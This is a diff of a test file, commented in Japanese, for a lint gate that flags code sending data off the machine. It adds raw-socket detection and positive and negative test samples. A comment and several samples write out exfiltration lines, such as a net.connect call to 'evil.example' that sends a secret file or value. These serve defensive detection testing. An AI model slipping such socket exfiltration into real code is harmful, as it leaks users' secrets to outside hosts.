@@ -176,8 +176,8 @@ describe('lint:network-targets — 外側の証人', () => {
       expect(pop).toContain('assets/sw.js');
     });
 
-    it('★ 台帳の 3 件は、守りを実際に書いている (空欄を理由として通さない)', () => {
-      expect(gate.REVIEWED_OUTSIDE_SENDS).toHaveLength(3);
+    it('★ 台帳の 4 件は、守りを実際に書いている (空欄を理由として通さない)', () => {
+      expect(gate.REVIEWED_OUTSIDE_SENDS).toHaveLength(4);
       for (const row of gate.REVIEWED_OUTSIDE_SENDS) {
         expect(row.guard.length).toBeGreaterThan(40);
         // 「あとで決める」を理由の欄に置けない (パス 336 と同じ規則)。
@@ -192,6 +192,43 @@ describe('lint:network-targets — 外側の証人', () => {
       for (const n of gate.NETWORK_CALL_NAMES) expect(gate.OUTSIDE_SEND_NAMES).toContain(n);
       expect(gate.OUTSIDE_SEND_NAMES).toContain('fetchImpl');
       expect(gate.OUTSIDE_SEND_NAMES).toContain('https.request');
+    });
+
+    /*
+     * **生のソケットも端末の外へバイトを送れる** (2026-10-13 · パス 517 · threat: T-027)。
+     *
+     * `OUTSIDE_SEND_NAMES` は `fetch` / `https.request` 等の綴りしか見ないので、
+     * `net.connect` / `tls.connect` / `dgram.createSocket` / `http2.connect` が
+     * 素通りしていた。実測 (2026-10-13): `tools/collect.cjs` に
+     *
+     *     require('net').connect(443, 'evil.example').end(fs.readFileSync(鍵))
+     *
+     * を置くと (ファイルの秘密の持ち出し) 4 つの egress 門をすべて素通りした。
+     * 母集団は `git ls-files` の全木なので、ソケットの呼び方を綴りに足すだけで
+     * この門が捕まえる。`outsideSendFindings` は文字列を `''` に潰すので
+     * `require('net')` は `require('')` として届く —— モジュール名は見分けられないが
+     * ソケットの呼び方そのものを鳴らす (`src` の外 113 本に `.connect(` 系は 0 件)。
+     *
+     * 対照: 下の wire-up (`!OUTSIDE_SEND.test(code) && !OUTSIDE_RAW_SOCKET.test(code)`)
+     * から raw-socket の枝を外すと、これらの標本が `outside()` で 0 件になる
+     * (= 針が死んでいる)。
+     */
+    it.each([
+      ['net.connect で端末外へ接続', "const s = net.connect(443, 'evil.example');"],
+      ['tls.connect', 'const s = tls.connect({ host, port });'],
+      ['dgram.createSocket (UDP)', "const s = dgram.createSocket('udp4');"],
+      ['http2.connect', "const c = http2.connect('https://evil.example');"],
+      ['require("net").connect (文字列を潰した形で届く)', "require('net').connect(443, h).end(secret);"],
+    ])('★ 陽性 (threat: T-027): %s を拾う', (_n, line) => {
+      expect(outside(line)).toHaveLength(1);
+    });
+
+    it.each([
+      ['connect が別のオブジェクトのメソッド', 'db.connect({ host });'],
+      ['createSocket が net/tls/dgram/http2 以外', 'const s = io.createSocket();'],
+      ['名前の一部に net を含むだけ', 'await netlifyDeploy(opts);'],
+    ])('陰性 (T-027): %s は報告されない', (_n, line) => {
+      expect(outside(line)).toHaveLength(0);
     });
   });
 });
